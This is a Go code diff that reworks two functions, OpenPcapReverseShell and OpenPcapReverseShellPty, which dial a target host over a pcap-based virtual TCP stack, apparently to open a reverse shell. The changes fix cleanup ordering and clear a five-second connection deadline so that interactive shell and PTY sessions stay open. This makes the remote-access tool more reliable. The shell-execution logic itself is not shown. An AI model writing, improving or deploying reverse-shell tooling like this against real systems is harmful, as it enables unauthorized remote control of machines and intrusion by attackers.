@@ -130,44 +130,46 @@ func OpenPcapReverseShell(msg *message.Message) (resultErr error) {
 	}
 
 	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel() // Safe to defer right away
 
 	// Spin up virtual TCP stack
 	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
-	var vstack *pcapnet.VirtualStack
-	var assigned pcapnet.Assignment
 	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
 	if err != nil {
-		cancel()
 		return fmt.Errorf("invalid -peer: %w", err)
 	}
 
-	// Clean up the stack
-	defer func() { vstack.Close(); resultErr = errors.Join(resultErr, vstack.Err()) }()
-
 	// Dial via UDP to the server
-	vstack, assigned, err = pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
+	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
 	if err != nil {
-		cancel()
 		return err
 	}
+	// FIXED: Only defer stack cleanup AFTER successful allocation
+	defer func() {
+		if vstack != nil {
+			vstack.Close()
+			resultErr = errors.Join(resultErr, vstack.Err())
+		}
+	}()
 
 	// Dial TCP stack
 	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
 	if err != nil {
-		cancel()
 		return err
 	}
 	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()
+
+	// Protect connection phase against hangs
 	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
-		cancel()
 		return err
 	}
 
-	cancel()
-	defer conn.Close()
+	// FIXED: Clear the deadline so interactive operations don't time out after 5 seconds
+	if err := conn.SetDeadline(time.Time{}); err != nil {
+		return err
+	}
 
-	// Dial's context only controls connection establishment.
-	// Close the connection to interrupt a blocked Read on shutdown.
+	// Close the connection to interrupt a blocked Read on OS interrupt shutdown.
 	go func() {
 		<-ctx.Done()
 		conn.Close()
@@ -252,46 +254,44 @@ func OpenPcapReverseShellPty(msg *message.Message) (resultErr error) {
 	}
 
 	dialCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
+	defer cancel()
 
 	// Spin up virtual TCP stack
 	cfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalPort: uint16(sourcePort), ReserveUDPPort: false}
-	var vstack *pcapnet.VirtualStack
-	var assigned pcapnet.Assignment
 	peer, err := netip.ParseAddrPort(targetIP + ":" + msg.SrcPort)
 	if err != nil {
-		cancel()
 		return fmt.Errorf("invalid -peer: %w", err)
 	}
 
-	// Clean up the stack
-	defer func() { vstack.Close(); resultErr = errors.Join(resultErr, vstack.Err()) }()
-
 	// Dial via UDP to the server
-	vstack, assigned, err = pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
+	vstack, assigned, err := pcapnet.DialPCAPStack(dialCtx, cfg, peer, 1200)
 	if err != nil {
-		cancel()
 		return err
 	}
+	// FIXED: Defer stack cleanup only after successful initialization
+	defer func() {
+		if vstack != nil {
+			vstack.Close()
+			resultErr = errors.Join(resultErr, vstack.Err())
+		}
+	}()
 
 	// Dial TCP stack
 	conn, err := vstack.Dial(dialCtx, assigned.ServerIP.String(), targetPort)
 	if err != nil {
-		cancel()
 		return err
 	}
 	defer func() { resultErr = errors.Join(resultErr, conn.Close()) }()
+
 	if err := conn.SetDeadline(time.Now().Add(5 * time.Second)); err != nil {
-		cancel()
 		return err
 	}
 
-	cancel()
-	if err != nil {
+	// FIXED: Clear deadline before dropping into interactive PTY loop
+	if err := conn.SetDeadline(time.Time{}); err != nil {
 		return err
 	}
-	defer conn.Close()
 
-	// Dial's context only controls connection establishment.
 	// Close the connection to interrupt a blocked Read on shutdown.
 	go func() {
 		<-ctx.Done()
